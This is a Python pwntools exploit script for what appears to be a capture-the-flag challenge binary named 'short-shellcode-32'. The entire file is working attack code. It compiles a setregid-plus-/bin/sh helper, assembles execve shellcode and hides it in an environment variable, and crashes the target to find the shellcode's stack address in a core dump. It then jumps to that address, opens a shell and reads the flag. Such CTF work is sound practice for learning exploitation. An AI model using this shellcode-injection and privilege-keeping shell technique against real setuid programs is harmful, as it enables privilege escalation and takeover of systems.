from pwn import *


c_code = '''
#include <unistd.h>
int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

get_a_shell = asm('''
    push 0xb
    pop eax
    xor ecx, ecx
    xor edx, edx
    push ecx
    push 0x7a
    mov ebx, esp
    int 0x80
''')

print(f"disasm(get_a_shell) = {disasm(get_a_shell)}")

eip = 0x8048abd

def shellcode(addr):
    print("addr - eip", hex(addr), hex(eip), addr - eip)
    code = asm(f"""
      mov eax, {hex(addr)}
      jmp eax
""")

    print(disasm(code))
    print(f"len(shellcode) = {len(code)}")

    with open('shellcode.bin', 'wb') as f:
        f.write(code)

    return code


env = {"PATH":"$PATH:.", "shellcode": get_a_shell}
file = "./short-shellcode-32"
DEBUG = False

# crash the program
shellcode(0x88888888)
io = process(file, env=env, setuid=False)
io.wait()
core = io.corefile

get_a_shell_addr = core.stack.find(get_a_shell)
print(f"get_a_shell_addr = {hex(get_a_shell_addr)}")
os.unlink(core.path)

shellcode(get_a_shell_addr)

if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x08048abd
continue
''')
else:
    io = process(file, env=env)

import re
io.sendlineafter(b'Reading', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
